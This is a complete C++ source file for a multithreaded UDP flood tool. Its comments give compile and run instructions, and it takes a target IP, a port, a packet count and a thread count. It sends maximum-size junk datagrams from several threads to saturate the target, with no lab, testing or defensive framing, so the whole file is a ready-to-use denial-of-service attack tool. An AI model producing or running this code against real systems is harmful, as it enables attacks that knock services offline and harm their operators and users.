// Compile: g++ -o udp_flood udp_flood.cpp -lpthread
// Run: sudo ./udp_flood <target_ip> <target_port> <count> <threads>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>

class UDPFlood {
private:
    std::string targetIP;
    int targetPort;
    std::atomic<int> counter{0};
    
public:
    UDPFlood(const std::string& ip, int port) : targetIP(ip), targetPort(port) {}
    
    void flood(int count) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return;
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(targetPort);
        target.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        char payload[65507];
        memset(payload, 'A', sizeof(payload));
        
        for (int i = 0; i < count; i++) {
            sendto(sock, payload, sizeof(payload), 0,
                   (struct sockaddr*)&target, sizeof(target));
            counter++;
        }
        
        close(sock);
    }
    
    void start(int count, int threads) {
        std::vector<std::thread> workers;
        int perThread = count / threads;
        
        for (int i = 0; i < threads; i++) {
            workers.emplace_back([this, perThread]() {
                flood(perThread);
            });
        }
        
        for (auto& t : workers) t.join();
        std::cout << "Sent " << counter << " packets\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_port> <count> <threads>\n";
        return 1;
    }
    UDPFlood flood(argv[1], atoi(argv[2]));
    flood.start(atoi(argv[3]), atoi(argv[4]));
    return 0;
}